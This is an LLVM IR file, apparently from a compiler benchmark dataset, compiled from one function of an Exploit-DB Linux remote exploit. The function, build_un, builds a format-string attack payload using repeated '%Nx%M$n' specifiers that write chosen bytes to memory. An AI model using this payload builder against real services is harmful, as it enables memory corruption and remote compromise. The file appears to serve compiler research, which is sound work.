; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_902.c_build_un.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_902.c_build_un.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [28 x i8] c"Can't allocate buffer (%d)\0A\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @build_un(i32 %0, i32 %1, i32 %2, i64 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i64 %3, i64* %8, align 8
  store i32 128, i32* %10, align 4
  store i32 256, i32* %15, align 4
  %16 = load i8, i8* %11, align 1
  %17 = load i8, i8* %12, align 1
  %18 = load i8, i8* %13, align 1
  %19 = load i8, i8* %14, align 1
  %20 = load i32, i32* %5, align 4
  %21 = call i32 @doit(i8 zeroext %16, i8 zeroext %17, i8 zeroext %18, i8 zeroext %19, i32 %20)
  %22 = load i32, i32* %10, align 4
  %23 = zext i32 %22 to i64
  %24 = mul i64 %23, 1
  %25 = trunc i64 %24 to i32
  %26 = call i64 @malloc(i32 %25)
  %27 = inttoptr i64 %26 to i8*
  store i8* %27, i8** %9, align 8
  %28 = icmp ne i8* %27, null
  br i1 %28, label %34, label %29

29:                                               ; preds = %4
  %30 = load i32, i32* @stderr, align 4
  %31 = load i32, i32* %10, align 4
  %32 = call i32 @fprintf(i32 %30, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0), i32 %31)
  %33 = call i32 @exit(i32 -1) #3
  unreachable

34:                                               ; preds = %4
  %35 = load i8*, i8** %9, align 8
  %36 = load i32, i32* %10, align 4
  %37 = call i32 @memset(i8* %35, i32 0, i32 %36)
  %38 = load i64, i64* %8, align 8
  %39 = load i8, i8* %14, align 1
  %40 = zext i8 %39 to i64
  %41 = sub nsw i64 %40, %38
  %42 = trunc i64 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i64, i64* %8, align 8
  %44 = load i8, i8* %13, align 1
  %45 = zext i8 %44 to i64
  %46 = sub nsw i64 %45, %43
  %47 = trunc i64 %46 to i8
  store i8 %47, i8* %13, align 1
  %48 = load i64, i64* %8, align 8
  %49 = load i8, i8* %12, align 1
  %50 = zext i8 %49 to i64
  %51 = sub nsw i64 %50, %48
  %52 = trunc i64 %51 to i8
  store i8 %52, i8* %12, align 1
  %53 = load i64, i64* %8, align 8
  %54 = load i8, i8* %11, align 1
  %55 = zext i8 %54 to i64
  %56 = sub nsw i64 %55, %53
  %57 = trunc i64 %56 to i8
  store i8 %57, i8* %11, align 1
  %58 = load i8*, i8** %9, align 8
  %59 = load i32, i32* %10, align 4
  %60 = load i8, i8* %14, align 1
  %61 = zext i8 %60 to i64
  %62 = sub i64 %61, 32
  %63 = load i32, i32* %15, align 4
  %64 = sext i32 %63 to i64
  %65 = add i64 %62, %64
  %66 = load i32, i32* %7, align 4
  %67 = zext i32 %66 to i64
  %68 = sub i64 %65, %67
  %69 = trunc i64 %68 to i8
  %70 = load i32, i32* %6, align 4
  %71 = load i8, i8* %13, align 1
  %72 = zext i8 %71 to i32
  %73 = load i8, i8* %14, align 1
  %74 = zext i8 %73 to i32
  %75 = sub nsw i32 %72, %74
  %76 = load i32, i32* %15, align 4
  %77 = add nsw i32 %75, %76
  %78 = trunc i32 %77 to i8
  %79 = load i32, i32* %6, align 4
  %80 = add i32 %79, 1
  %81 = load i8, i8* %12, align 1
  %82 = zext i8 %81 to i32
  %83 = load i8, i8* %13, align 1
  %84 = zext i8 %83 to i32
  %85 = sub nsw i32 %82, %84
  %86 = load i32, i32* %15, align 4
  %87 = add nsw i32 %85, %86
  %88 = trunc i32 %87 to i8
  %89 = load i32, i32* %6, align 4
  %90 = add i32 %89, 2
  %91 = load i8, i8* %11, align 1
  %92 = zext i8 %91 to i32
  %93 = load i8, i8* %12, align 1
  %94 = zext i8 %93 to i32
  %95 = sub nsw i32 %92, %94
  %96 = load i32, i32* %15, align 4
  %97 = add nsw i32 %95, %96
  %98 = trunc i32 %97 to i8
  %99 = load i32, i32* %6, align 4
  %100 = add i32 %99, 3
  %101 = call i32 @snprintf(i8* %58, i32 %59, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0), i8 zeroext %69, i32 %70, i8 zeroext %78, i32 %80, i8 zeroext %88, i32 %90, i8 zeroext %98, i32 %100)
  %102 = load i8*, i8** %9, align 8
  ret i8* %102
}

declare dso_local i32 @doit(i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @fprintf(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8 zeroext, i32, i8 zeroext, i32, i8 zeroext, i32, i8 zeroext, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
